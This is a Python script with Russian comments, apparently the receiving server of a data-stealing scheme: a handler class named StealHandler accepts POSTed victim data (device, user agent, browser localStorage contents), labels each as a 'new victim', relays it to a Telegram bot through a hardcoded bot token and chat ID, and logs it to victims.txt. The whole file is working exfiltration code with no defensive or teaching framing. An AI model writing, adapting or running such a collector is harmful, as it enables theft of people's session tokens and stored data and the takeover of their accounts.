
BOT_TOKEN = "8716367174:AAHeVAICMospl7aYouFRJBUcU2FCdOixgxM"  # ВСТАВЬ СЮДА
CHAT_ID = "8019526165"           # ВСТАВЬ СЮДА
from http.server import HTTPServer, BaseHTTPRequestHandler
import requests
import json

# ========== НАСТРОЙКИ (ЗАМЕНИ НА СВОИ) ==========
BOT_TOKEN = "8716367174:AAHeVAICMospl7aYouFRJBUcU2FCdOixgxM"  # ТОКЕН ОТ BOTFATHER
CHAT_ID = "8019526165"                                 # ТВОЙ TELEGRAM ID
# =================================================

class StealHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            # Получаем длину данных
            content_length = int(self.headers['Content-Length'])
            # Читаем данные
            post_data = self.rfile.read(content_length)
            # Парсим JSON
            data = json.loads(post_data.decode('utf-8'))
            
            # Формируем сообщение для Telegram
            message = f"🔑 НОВАЯ ЖЕРТВА!\n\n"
            message += f"📱 Устройство: {data.get('device', 'Unknown')}\n"
            message += f"📲 В Telegram: {'Да' if data.get('in_telegram') else 'Нет'}\n"
            message += f"🌐 User Agent: {data.get('ua', '')[:100]}\n"
            message += f"⏰ Время: {data.get('time', '')}\n\n"
            message += f"💾 localStorage:\n{json.dumps(data.get('storage', {}), ensure_ascii=False)[:800]}"
            
            # Отправляем в Telegram
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
            requests.post(url, json=payload, timeout=10)
            
            # Сохраняем в файл
            with open('victims.txt', 'a', encoding='utf-8') as f:
                f.write(f"\n{'='*50}\n")
                f.write(f"Время: {data.get('time')}\n")
                f.write(f"Устройство: {data.get('device')}\n")
                f.write(f"В Telegram: {data.get('in_telegram')}\n")
                f.write(f"User Agent: {data.get('ua')}\n")
                f.write(f"Данные: {json.dumps(data.get('storage'), ensure_ascii=False)}\n")
            
            # Отправляем ответ
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status": "ok"}')
            
        except Exception as e:
            print(f"Ошибка: {e}")
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b'{"status": "error"}')
    
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(b'Bot is running. Send POST request with data.')

# Запуск сервера
print("Бот запущен на порту 5000")
print("Жду данные...")
HTTPServer(('0.0.0.0', 5000), StealHandler).serve_forever()
